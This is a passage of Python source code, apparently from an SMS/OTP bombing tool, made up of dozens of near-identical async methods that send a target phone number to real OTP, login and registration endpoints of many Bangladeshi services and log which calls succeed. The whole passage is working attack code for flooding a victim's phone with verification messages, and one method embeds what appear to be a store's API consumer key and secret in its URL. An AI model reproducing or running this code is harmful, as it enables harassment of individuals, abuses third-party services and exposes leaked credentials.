            await self.log_event("API_NEW_79 - api-merchant.carrybee.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_80(self):
        target = self.target
        url = "https://api.apex4u.com/api/auth/login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_80 - api.apex4u.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_80 - api.apex4u.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_81(self):
        target = self.target
        url = "https://api.binge.buzz/api/v4/auth/otp/send".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_81 - api.binge.buzz", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_81 - api.binge.buzz", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_82(self):
        target = self.target
        url = "https://api.doctime.com.bd/api/authenticate".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_82 - api.doctime.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_82 - api.doctime.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_83(self):
        target = self.target
        url = "https://api.englishmojabd.com/api/v1/auth/login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_83 - api.englishmojabd.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_83 - api.englishmojabd.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_84(self):
        target = self.target
        url = "https://api.garibookadmin.com/api/v3/user/login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_84 - api.garibookadmin.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_84 - api.garibookadmin.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_85(self):
        target = self.target
        url = "https://api.garibookadmin.com/api/v4/user/login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_85 - api.garibookadmin.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_85 - api.garibookadmin.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_86(self):
        target = self.target
        url = "https://api.hishabexpress.com/login/status".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_86 - api.hishabexpress.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_86 - api.hishabexpress.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_87(self):
        target = self.target
        url = "https://api.hishabpati.com/api/v1/merchant/register/otp/v2".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_87 - api.hishabpati.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_87 - api.hishabpati.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_88(self):
        target = self.target
        url = "https://api.kabbik.com/v1/auth/otpnew".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_88 - api.kabbik.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_88 - api.kabbik.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_89(self):
        target = self.target
        url = "https://api.kabbik.com/v1/auth/otpnew2".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_89 - api.kabbik.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_89 - api.kabbik.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_90(self):
        target = self.target
        url = "https://api.kfcbd.com/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_90 - api.kfcbd.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_90 - api.kfcbd.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_91(self):
        target = self.target
        url = "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_91 - api.mygp.cinematic.mobi", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_91 - api.mygp.cinematic.mobi", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_92(self):
        target = self.target
        url = "https://api.osudpotro.com/api/v1/users/send_otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_92 - api.osudpotro.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_92 - api.osudpotro.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_93(self):
        target = self.target
        url = "https://api.pathao.com/v2/auth/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_93 - api.pathao.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_93 - api.pathao.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_94(self):
        target = self.target
        url = "https://api.rootsedulive.com/v2/auth/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_94 - api.rootsedulive.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_94 - api.rootsedulive.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_95(self):
        target = self.target
        url = "https://api.sparkchat.net/api/v1/auth/signin".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_95 - api.sparkchat.net", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_95 - api.sparkchat.net", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_96(self):
        target = self.target
        url = "https://api.sundora.com.bd/api/user/customer/".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_96 - api.sundora.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_96 - api.sundora.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_97(self):
        target = self.target
        url = "https://api.win2gain.com/api/Users/IsUserLogin?msisdn=880{phone}".replace("{phone}", target)
        try:
            async with self.session.get(url, json={"msisdn": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_97 - api.win2gain.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_97 - api.win2gain.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_98(self):
        target = self.target
        url = "https://api.win2gain.com/api/Users/IsUserLogin?msisdn={phone}".replace("{phone}", target)
        try:
            async with self.session.get(url, json={"msisdn": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_98 - api.win2gain.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_98 - api.win2gain.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_99(self):
        target = self.target
        url = "https://apialpha.pbs.com.bd/api/OTP/generateOTP".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_99 - apialpha.pbs.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_99 - apialpha.pbs.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_100(self):
        target = self.target
        url = "https://app.eonbazar.com/api/auth/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_100 - app.eonbazar.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_100 - app.eonbazar.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_101(self):
        target = self.target
        url = "https://app.eonbazar.com/api/v2/auth/login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_101 - app.eonbazar.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_101 - app.eonbazar.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_102(self):
        target = self.target
        url = "https://app.kireibd.com/api/v2/send-login-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_102 - app.kireibd.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_102 - app.kireibd.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_103(self):
        target = self.target
        url = "https://app.priyoshikkhaloy.com/api/user/register-login.php".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_103 - app.priyoshikkhaloy.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_103 - app.priyoshikkhaloy.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_104(self):
        target = self.target
        url = "https://apps.applink.com.bd/appstore-v4-server/login/otp/request".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_104 - apps.applink.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_104 - apps.applink.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_105(self):
        target = self.target
        url = "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_105 - backend-api.shomvob.co", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_105 - backend-api.shomvob.co", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_106(self):
        target = self.target
        url = "https://bcsexamaid.com/api/generateotp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_106 - bcsexamaid.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_106 - bcsexamaid.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_107(self):
        target = self.target
        url = "https://binge.buzz/login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_107 - binge.buzz", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_107 - binge.buzz", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_108(self):
        target = self.target
        url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_108 - bkshopthc.grameenphone.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_108 - bkshopthc.grameenphone.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_109(self):
        target = self.target
        url = "https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_109 - bkwebsitethc.grameenphone.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_109 - bkwebsitethc.grameenphone.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_110(self):
        target = self.target
        url = "https://core.easy.com.bd/api/v1/registration".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_110 - core.easy.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_110 - core.easy.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_111(self):
        target = self.target
        url = "https://dev.etestpaper.net/api/v4/auth/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_111 - dev.etestpaper.net", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_111 - dev.etestpaper.net", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_112(self):
        target = self.target
        url = "https://developer.medha.info/api/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_112 - developer.medha.info", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_112 - developer.medha.info", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_113(self):
        target = self.target
        url = "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_113 - developer.quiztime.gamehubbd.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_113 - developer.quiztime.gamehubbd.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_114(self):
        target = self.target
        url = "https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_114 - dressup.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_114 - dressup.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_115(self):
        target = self.target
        url = "https://ecom.rangs.com.bd/send-otp-code".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_115 - ecom.rangs.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_115 - ecom.rangs.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_116(self):
        target = self.target
        url = "https://foodaholic.com.bd/api/v1/auth/login-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_116 - foodaholic.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_116 - foodaholic.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_117(self):
        target = self.target
        url = "https://foodaholic.com.bd/api/v1/auth/sign-up".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_117 - foodaholic.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_117 - foodaholic.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_118(self):
        target = self.target
        url = "https://gateway.otithee.com/api/v1/generate-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_118 - gateway.otithee.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_118 - gateway.otithee.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_119(self):
        target = self.target
        url = "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_119 - gpfi-api.grameenphone.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_119 - gpfi-api.grameenphone.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_120(self):
        target = self.target
        url = "https://host.proiojon.com/api/v1/auth/login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_120 - host.proiojon.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_120 - host.proiojon.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_121(self):
        target = self.target
        url = "https://host.proiojon.com/api/v1/auth/sign-up".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_121 - host.proiojon.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_121 - host.proiojon.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_122(self):
        target = self.target
        url = "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_122 - m-backend.wafilife.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_122 - m-backend.wafilife.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_123(self):
        target = self.target
        url = "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_123 - mybdjobsorchestrator-odcx6humqq-as.a.run.app", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_123 - mybdjobsorchestrator-odcx6humqq-as.a.run.app", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_124(self):
        target = self.target
        url = "https://myblapi.banglalink.net/api/v1/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_124 - myblapi.banglalink.net", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_124 - myblapi.banglalink.net", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_125(self):
        target = self.target
        url = "https://npapigwnew.nobopay.com/api/v2/tp/registration/otp/send".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_125 - npapigwnew.nobopay.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_125 - npapigwnew.nobopay.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_126(self):
        target = self.target
        url = "https://offers.sindabad.com/api/mobile-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_126 - offers.sindabad.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_126 - offers.sindabad.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_127(self):
        target = self.target
        url = "https://othoba.com/register?returnUrl=%2F".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_127 - othoba.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_127 - othoba.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_128(self):
        target = self.target
        url = "https://othoba.com/register?returnurl=%2F".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_128 - othoba.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_128 - othoba.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_129(self):
        target = self.target
        url = "https://otp-backend.fly.dev/api/otp/send".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_129 - otp-backend.fly.dev", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_129 - otp-backend.fly.dev", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_130(self):
        target = self.target
        url = "https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_130 - phonebill.btcl.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_130 - phonebill.btcl.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_131(self):
        target = self.target
        url = "https://prod-services.toffeelive.com/sms/v1/subscriber/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_131 - prod-services.toffeelive.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_131 - prod-services.toffeelive.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_132(self):
        target = self.target
        url = "https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT".replace("{phone}", target)
        try:
            async with self.session.get(url, json=None, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_132 - rflbestbuy.com", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_132 - rflbestbuy.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_133(self):
        target = self.target
        url = "https://steadfast.com.bd/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_133 - steadfast.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_133 - steadfast.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_134(self):
        target = self.target
        url = "https://steadfast.com.bd/register/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_134 - steadfast.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_134 - steadfast.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_135(self):
        target = self.target
        url = "https://sundora.com.bd/apps/auth/api/otp/send".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_135 - sundora.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_135 - sundora.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api_new_136(self):
        target = self.target
        url = "https://waltonplaza.com.bd/api/auth/otp/create".replace("{phone}", target)
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API_NEW_136 - waltonplaza.com.bd", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API_NEW_136 - waltonplaza.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

